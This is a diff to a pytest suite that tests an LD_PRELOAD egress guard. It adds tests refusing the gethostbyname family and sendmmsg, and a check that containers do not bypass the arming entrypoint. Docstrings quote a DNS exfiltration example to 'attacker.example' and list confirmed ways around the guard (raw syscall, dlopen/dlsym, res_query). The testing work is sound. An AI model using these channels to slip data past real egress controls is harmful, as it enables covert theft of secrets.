@@ -6,7 +6,7 @@ see: `netguard.py` patches `socket.socket`, every unit test of it passed, and gr
 past all of it. A test that read the source, or asserted that the chart sets `LD_PRELOAD`, would
 have been green throughout.
 
-Three arms, and the two controls are the point:
+Four arms, and the three controls are the point:
 
   A  no interposer, non-loopback target  → SUCCEEDS. Without this the probe cannot observe success,
      and a refusal proves nothing — the first attempt at this measurement aimed at an address that
@@ -14,6 +14,9 @@ Three arms, and the two controls are the point:
   B  interposer, non-loopback target     → refused.
   C  interposer, loopback target         → SUCCEEDS. The layer must not break the dials this
      deployment makes to Postgres, Temporal and the calc backend.
+  D  interposer, target allowlisted      → SUCCEEDS. What distinguishes an allowlist from a
+     deny-all; without it B and C are equally consistent with a layer that breaks every declared
+     destination (`test_an_address_on_the_derived_allowlist_is_reachable`).
 
 The listener is a **real gRPC server** in the test process, bound to `0.0.0.0` so the same port is
 reachable by both a loopback and a non-loopback address. `grpc.channel_ready_future` only resolves
@@ -54,6 +57,9 @@ _CONTAINERFILE = _ROOT / "deploy" / "Containerfile"
 #: `SIOCGIFADDR`. Used to read an interface's own address without a connect, a DNS lookup or any
 #: other operation the guard under test might refuse.
 _SIOCGIFADDR = 0x8915
+
+#: The loader variable the entrypoint exports and no chart file may set.
+_PRELOAD_VARIABLE = "LD_PRELOAD"
 
 
 @pytest.fixture(scope="module")
@@ -306,6 +312,97 @@ def test_a_name_off_the_allowlist_never_reaches_the_resolver(interposer: Path) -
     assert "resolve SUCCEEDED" in allowed, allowed
 
 
+_RESOLVER_FAMILY_CLIENT = """
+import ctypes, sys
+
+class hostent(ctypes.Structure):
+    _fields_ = [
+        ("h_name", ctypes.c_char_p),
+        ("h_aliases", ctypes.POINTER(ctypes.c_char_p)),
+        ("h_addrtype", ctypes.c_int),
+        ("h_length", ctypes.c_int),
+        ("h_addr_list", ctypes.POINTER(ctypes.POINTER(ctypes.c_ubyte))),
+    ]
+
+libc = ctypes.CDLL(None, use_errno=True)
+name = sys.argv[1].encode()
+AF_INET = 2
+
+def report(label, pointer, extra=""):
+    if not pointer:
+        print(f"{label} refused{extra}")
+        return
+    entry = pointer.contents
+    raw = bytes(entry.h_addr_list[0][i] for i in range(entry.h_length))
+    print(f"{label} SUCCEEDED " + ".".join(str(octet) for octet in raw))
+
+plain = libc.gethostbyname
+plain.restype, plain.argtypes = ctypes.POINTER(hostent), [ctypes.c_char_p]
+report("gethostbyname", plain(name))
+
+two = libc.gethostbyname2
+two.restype, two.argtypes = ctypes.POINTER(hostent), [ctypes.c_char_p, ctypes.c_int]
+report("gethostbyname2", two(name, AF_INET))
+
+buffer = ctypes.create_string_buffer(8192)
+for label, reentrant, leading in (
+    ("gethostbyname_r", libc.gethostbyname_r, [ctypes.c_char_p]),
+    ("gethostbyname2_r", libc.gethostbyname2_r, [ctypes.c_char_p, ctypes.c_int]),
+):
+    entry, result, herr = hostent(), ctypes.POINTER(hostent)(), ctypes.c_int(-1)
+    reentrant.restype = ctypes.c_int
+    reentrant.argtypes = leading + [
+        ctypes.POINTER(hostent), ctypes.c_char_p, ctypes.c_size_t,
+        ctypes.POINTER(ctypes.POINTER(hostent)), ctypes.POINTER(ctypes.c_int),
+    ]
+    head = [name] if len(leading) == 1 else [name, AF_INET]
+    status = reentrant(*head, ctypes.byref(entry), buffer, len(buffer),
+                       ctypes.byref(result), ctypes.byref(herr))
+    report(label, result, extra=f" status={status} h_errno={herr.value}")
+
+read = libc.chemclaw_netguard_preload_refused
+read.restype, read.argtypes = ctypes.c_ulong, [ctypes.c_int]
+print(f"resolve={read(1)} connect={read(0)}")
+"""
+
+#: The four entry points the `getaddrinfo`-only check walked past.
+_RESOLVER_FAMILY = ("gethostbyname", "gethostbyname2", "gethostbyname_r", "gethostbyname2_r")
+
+
+def test_the_whole_resolver_family_is_refused_and_not_only_getaddrinfo(interposer: Path) -> None:
+    """The DNS exfiltration channel the port-53 exemption left open, closed.
+
+    `check_address` lets any datagram to a `/etc/resolv.conf` nameserver on port 53 through, and the
+    C header justified that by saying an off-allowlist *name* "never gets that far, because
+    `getaddrinfo` refuses it first". True of `getaddrinfo` and of nothing else. Measured on one
+    binary with the allowlist `127.0.0.1,localhost`: `getaddrinfo` was refused with `EAI_NONAME`
+    while all four names below returned the real address, with the resolve counter flat and nothing
+    written to stderr — so `gethostbyname("<secret>.attacker.example")` reached an attacker's
+    nameserver on a pod an operator reads as clean. It was also a disagreement with `netguard.py`
+    in the wrong direction: the Python layer patches `socket.gethostbyname` precisely because that
+    entry point matters.
+
+    Driven through `ctypes.CDLL(None)` rather than `socket.gethostbyname`, because CPython resolves
+    that through `getaddrinfo` and so cannot reach this family at all — part of why the gap
+    survived. Both arms use the host's own name, so neither needs a query to leave this host, and
+    the **allowed** arm is what stops an interposer that refuses every lookup passing.
+    """
+    own = socket.gethostname()
+    refused = _drive(own, library=interposer, script=_RESOLVER_FAMILY_CLIENT)
+    for entry_point in _RESOLVER_FAMILY:
+        assert f"{entry_point} refused" in refused, refused
+    # glibc's own NXDOMAIN contract, measured rather than guessed: the `_r` forms answer 0 with a
+    # NULL result and `HOST_NOT_FOUND`, never a nonzero status (which means ERANGE to a caller).
+    # Asserted per entry point rather than as one loose substring — the first version of this line
+    # matched either `_r` report, and a mutation of one of the two survived it.
+    for entry_point in ("gethostbyname_r", "gethostbyname2_r"):
+        assert f"{entry_point} refused status=0 h_errno=1" in refused, refused
+    assert "resolve=4 connect=0" in refused, refused
+    allowed = _drive(own, library=interposer, allow=own.lower(), script=_RESOLVER_FAMILY_CLIENT)
+    for entry_point in _RESOLVER_FAMILY:
+        assert f"{entry_point} SUCCEEDED" in allowed, allowed
+
+
 _NAMESERVER_CLIENT = """
 import socket, sys
 header = bytes.fromhex("abcd01000001000000000000")
@@ -361,6 +458,67 @@ def test_a_datagram_to_an_undeclared_host_is_refused(interposer: Path) -> None:
     output = _drive(address, library=interposer, script=_NAMESERVER_CLIENT)
     assert "sendto refused" in output, output
     assert f"refused sendto to {address}:53" in output, output
+
+
+_BATCH_DATAGRAM_CLIENT = """
+import ctypes, socket, sys
+
+class iovec(ctypes.Structure):
+    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
+
+class msghdr(ctypes.Structure):
+    _fields_ = [("msg_name", ctypes.c_void_p), ("msg_namelen", ctypes.c_uint32),
+                ("msg_iov", ctypes.POINTER(iovec)), ("msg_iovlen", ctypes.c_size_t),
+                ("msg_control", ctypes.c_void_p), ("msg_controllen", ctypes.c_size_t),
+                ("msg_flags", ctypes.c_int)]
+
+class mmsghdr(ctypes.Structure):
+    _fields_ = [("msg_hdr", msghdr), ("msg_len", ctypes.c_uint)]
+
+host, port = sys.argv[1].rsplit(":", 1)
+address = ctypes.create_string_buffer(16)
+ctypes.memmove(
+    address,
+    socket.AF_INET.to_bytes(2, "little") + int(port).to_bytes(2, "big") + socket.inet_aton(host),
+    8,
+)
+payload = ctypes.create_string_buffer(b"probe")
+vector = iovec(ctypes.cast(payload, ctypes.c_void_p), 5)
+batch = (mmsghdr * 2)()
+for message in batch:
+    message.msg_hdr.msg_name = ctypes.cast(address, ctypes.c_void_p)
+    message.msg_hdr.msg_namelen = 16
+    message.msg_hdr.msg_iov = ctypes.pointer(vector)
+    message.msg_hdr.msg_iovlen = 1
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+libc = ctypes.CDLL(None, use_errno=True)
+libc.sendmmsg.restype = ctypes.c_int
+libc.sendmmsg.argtypes = [ctypes.c_int, ctypes.POINTER(mmsghdr), ctypes.c_uint, ctypes.c_int]
+sent = libc.sendmmsg(sock.fileno(), batch, 2, 0)
+print(f"sendmmsg SUCCEEDED {sent}" if sent > 0 else f"sendmmsg refused {ctypes.get_errno()}")
+"""
+
+
+def test_a_batched_datagram_to_an_undeclared_host_is_refused(interposer: Path) -> None:
+    """`sendmmsg` was on the conceded list, and it was measured connecting.
+
+    It is `sendmsg`'s batching form with one destination per message, so leaving it uninterposed
+    left a datagram channel past `connect`, past `sendto` and past `sendmsg`. Measured against a
+    real non-loopback route it sent both messages with the interposer armed; the check is six lines,
+    which is cheaper than the concession. One refused address refuses the whole batch, because a
+    partial send would report success for a batch this layer did not permit. The allowed arm is here
+    for the same reason as everywhere else in this file.
+    """
+    address = _non_loopback_address()
+    if address is None:  # pragma: no cover - single-interface host
+        pytest.skip("no non-loopback interface: there is no off-box route to measure")
+    refused = _drive(f"{address}:53", library=interposer, script=_BATCH_DATAGRAM_CLIENT)
+    assert "sendmmsg refused" in refused, refused
+    assert f"refused sendmmsg to {address}:53" in refused, refused
+    allowed = _drive(
+        f"{address}:53", library=interposer, allow=address, script=_BATCH_DATAGRAM_CLIENT
+    )
+    assert "sendmmsg SUCCEEDED" in allowed, allowed
 
 
 _ARMED_CLIENT = """
@@ -476,10 +634,117 @@ def test_no_shipped_deployment_starts_without_arming_the_compiled_layer() -> Non
     chart = _ROOT / "deploy" / "helm" / "chemclaw"
     for document in [chart / "values.yaml", *sorted((chart / "templates").glob("*.yaml"))]:
         for line in document.read_text(encoding="utf-8").splitlines():
-            assert not re.match(r"\s*(-\s*name:\s*)?LD_PRELOAD\s*:?\s*", line), (
-                f"{document.name} sets LD_PRELOAD; arming belongs to the image so that `docker "
-                "run`, the connector pods and a hand-started worker cannot differ from the chart"
+            assert not re.match(rf"\s*(-\s*name:\s*)?{_PRELOAD_VARIABLE}\s*:?\s*", line), (
+                f"{document.name} sets {_PRELOAD_VARIABLE}; arming belongs to the image so that "
+                "`docker run`, the connector pods and a hand-started worker cannot differ from "
+                "the chart"
             )
+
+
+#: The image's `ENTRYPOINT`, which is the only thing that arms the compiled layer. A Kubernetes
+#: `command:` **replaces** it rather than prefixing it, which is the whole of the finding below.
+_IMAGE_ENTRYPOINT = "/usr/local/bin/chemclaw-entrypoint"
+
+#: Containers that run this image and deliberately do **not** reach the entrypoint, each with the
+#: argument for it. A partition rather than a skip list: the test derives the real set from the
+#: templates, so a new workload with its own `command:` fails here until somebody writes the
+#: sentence — which is the step the three hook Jobs never had.
+_CONTAINERS_THAT_BYPASS_THE_ENTRYPOINT: dict[str, str] = {
+    # `git clone`/`fetch` against the note repository, on a loop. Named in `entrypoint.sh`'s own
+    # comment since the layer shipped: what they dial is a git remote, which is not on the settings
+    # object `derive_allowed` reads, so arming them would refuse the sync rather than bound it.
+    # They are bounded by the NetworkPolicy, and the ADR carries the open row.
+    "knowledge-sync-init": "git against the note remote, which no setting derives",
+    "knowledge-sync": "git against the note remote, which no setting derives",
+    "note-repo-init": "git against the note remote, which no setting derives",
+}
+
+
+def _image_containers() -> dict[str, list[str]]:
+    """Every container in the chart that runs `chemclaw.image`, mapped to its `command`.
+
+    Read off the template text because this suite is the offline half (`make helm-validate` is what
+    renders), and *derived* rather than listed because a listed set is exactly what was missing:
+    nothing checked that a container using this image reaches the image's `ENTRYPOINT`, so three
+    shipped Jobs ran with the loader variable unset while every assertion in this file stayed green.
+
+    A container is `- name: x` plus the fields indented two further; `command:` is matched at
+    exactly that field indentation, so a `lifecycle.preStop` hook's own `command` — nested deeper —
+    is not mistaken for the container's. Both spellings are read, the inline JSON list and the
+    block list, because the three Jobs used one each.
+    """
+    chart = _ROOT / "deploy" / "helm" / "chemclaw" / "templates"
+    found: dict[str, list[str]] = {}
+    for document in [*sorted(chart.glob("*.yaml")), chart / "_helpers.tpl"]:
+        lines = document.read_text(encoding="utf-8").splitlines()
+        starts = [
+            (index, len(match.group(1)), match.group(2))
+            for index, line in enumerate(lines)
+            if (match := re.match(r"^(\s*)- name: ([A-Za-z0-9-]+(?:\{\{[^}]*\}\})?)\s*$", line))
+        ]
+        for position, (index, indent, name) in enumerate(starts):
+            end = starts[position + 1][0] if position + 1 < len(starts) else len(lines)
+            block = lines[index + 1 : end]
+            field = " " * (indent + 2)
+            if not any(
+                line.startswith(f"{field}image:") and "chemclaw.image" in line for line in block
+            ):
+                continue
+            command: list[str] = []
+            for offset, line in enumerate(block):
+                if not line.startswith(f"{field}command:"):
+                    continue
+                inline = line.split("command:", 1)[1].strip()
+                if inline:
+                    command = re.findall(r'"([^"]*)"', inline)
+                else:
+                    for item in block[offset + 1 :]:
+                        entry = re.match(rf"{field}  - (.*)$", item)
+                        if entry is None:
+                            break
+                        command.append(entry.group(1).strip().strip('"'))
+                break
+            found[name] = command
+    return found
+
+
+def test_every_container_running_this_image_reaches_the_entrypoint_that_arms_it() -> None:
+    """A Kubernetes `command:` replaces the image `ENTRYPOINT` — it does not prefix it.
+
+    Arming happens inside `deploy/entrypoint.sh` and nowhere else, so a container that declares its
+    own `command:` runs with the compiled layer absent. Three shipped workloads did: the Schedules
+    hook Job (`python -m chemclaw.cli.schedules`, which runs on **every** `helm upgrade` and whose
+    entire outbound traffic is gRPC to Temporal through the Rust sdk-core — the exact class
+    `netguard.py` measurably cannot see), and both halves of the migration hook.
+
+    The test above could not see any of it, and that is why this one exists: it asserts that arming
+    precedes dispatch *inside* the script, and that no chart file *sets* the loader variable. Both
+    were true while three Jobs never ran the script at all. Nor could the metrics have answered it —
+    a hook Job declares no port, so `chemclaw_egress_preload_armed` is never scraped from one, and
+    the entrypoint is the only control those workloads have.
+    """
+    containers = _image_containers()
+    assert len(containers) > 5, f"the container derivation found almost nothing: {containers}"
+    bypassing = {
+        name: command
+        for name, command in containers.items()
+        if command and command[0] != _IMAGE_ENTRYPOINT
+    }
+    unargued = {
+        name: command
+        for name, command in bypassing.items()
+        if name not in _CONTAINERS_THAT_BYPASS_THE_ENTRYPOINT
+    }
+    assert not unargued, (
+        "these containers run the Chemclaw image with their own `command:`, which replaces the "
+        f"ENTRYPOINT that arms the compiled egress layer: {unargued}. Either drop the `command:` "
+        "and name the component in `CHEMCLAW_COMPONENT`, or add the container to "
+        "`_CONTAINERS_THAT_BYPASS_THE_ENTRYPOINT` with the argument for it"
+    )
+    assert set(_CONTAINERS_THAT_BYPASS_THE_ENTRYPOINT) <= set(containers), (
+        "the exemption list names a container this chart no longer has: "
+        f"{sorted(set(_CONTAINERS_THAT_BYPASS_THE_ENTRYPOINT) - set(containers))}"
+    )
 
 
 _STUB_PYTHON = """#!/bin/sh
@@ -553,14 +818,22 @@ def test_a_failed_derivation_stops_the_container_rather_than_skipping_the_layer(
 def test_the_interposer_states_what_it_cannot_cover() -> None:
     """A layer that implies more than it enforces is the defect, not the documentation of it.
 
-    The three uncoverable classes are properties of dynamic linking rather than of this code, so
-    they cannot be asserted by running anything — what can be asserted is that the module says so,
-    in the file a reader opens.
+    The uncoverable classes are properties of dynamic linking rather than of this code, so they
+    cannot be asserted by running anything — what can be asserted is that the module says so, in the
+    file a reader opens. Each was driven first: `syscall(SYS_connect, …)` and a
+    `dlopen("libc.so.6")` + `dlsym("connect")` both reached a real gRPC server over a non-loopback
+    route with the interposer armed, and `res_query` returned a 61-byte answer for an off-allowlist
+    name. `sendmmsg` was on this list and was measured connecting too — it is interposed now rather
+    than conceded, which is why it must be *absent* here: a stale concession reads as a gap and
+    invites somebody to close it twice.
     """
     source = netguard_preload.SOURCE.read_text(encoding="utf-8")
     header = source.split("*/", 1)[0]
-    for concession in ("statically linked", "syscall directly", "sendmmsg"):
+    for concession in ("statically linked", "syscall directly", "res_query", "dlopen"):
         assert concession in header, f"the header does not concede {concession!r}"
+    assert "sendmmsg" not in header.split("WHAT IT DOES NOT COVER", 1)[1], (
+        "the header still concedes `sendmmsg`, which this layer now interposes"
+    )
 
 
 def test_every_preload_metric_this_module_binds_is_declared() -> None:
